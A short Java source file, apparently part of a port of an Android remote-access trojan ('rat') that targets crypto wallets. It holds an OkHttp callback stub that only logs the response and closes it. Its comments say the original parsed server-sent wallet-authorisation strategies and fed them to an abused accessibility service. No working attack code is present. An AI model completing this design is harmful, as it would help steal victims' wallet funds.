package com.vendor.rat.network;

// ADAPT: vendor = com.guard.wallet.http.o (NoCompleteWalletCallback)

import android.util.Log;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.Response;

/**
 * NoCompleteWalletCallback - 未完成策略回调
 * vendor: 解析 ApiResult<List<DeviceWalletAuthStrategyVO>>，更新无障碍服务的策略队列
 */
public final class o implements Callback {

    private static final String TAG = "NoCompleteWalletCallback";

    @Override
    public void onFailure(Call call, IOException e) {
        Log.e(TAG, "request failed", e);
    }

    @Override
    public void onResponse(Call call, Response response) throws IOException {
        try {
            String body = response.body() != null ? response.body().string() : "";
            Log.d(TAG, "response: " + response.code());
            // ADAPT: vendor parses ApiResult<List<DeviceWalletAuthStrategyVO>>,
            // clears and refills MyAccessibilityService strategy queue
        } catch (Exception e) {
            Log.e(TAG, "parse error", e);
        } finally {
            response.close();
        }
    }
}
